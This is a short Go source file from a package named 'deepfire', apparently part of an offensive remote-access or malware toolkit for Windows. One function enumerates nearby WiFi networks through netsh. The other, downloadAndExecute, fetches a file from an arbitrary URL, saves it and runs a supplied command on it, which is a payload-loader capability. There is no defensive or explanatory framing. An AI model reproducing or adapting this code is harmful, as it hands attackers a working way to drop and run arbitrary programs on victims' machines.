package deepfire

import (
	"io"
	"net/http"
	"os"
	"strings"
)

func networks() ([]string, error) {
	wifi_names := []string{}

	out, err := cmdOut("netsh wlan show networks")
	if err != nil {
		return nil, err
	}
	o := strings.Split(out, "\n")[1:]
	for entry := range o {
		e := o[entry]
		if strings.Contains(e, "SSID") {
			wifi_name := strings.Split(e, ":")[1]
			wifi_names = append(wifi_names, wifi_name)
		}
	}

	return wifi_names, nil
}

func downloadAndExecute(url string, cmd string) (string, error) {
	splitted := strings.Split(url, "/")
	filename := splitted[len(splitted)-1]

	f, err := os.Create(filename)
	if err != nil {
		return "failed", err
	}
	defer f.Close()

	response, err := http.Get(url)
	if err != nil {
		return "failed", err
	}
	defer response.Body.Close()

	_, err = io.Copy(f, response.Body)
	if err != nil {
		return "failed", err
	}
	_cmd := strings.Replace(cmd, "[file]", filename, 1)
	out, er := CmdOut(_cmd)
	return out, er
}
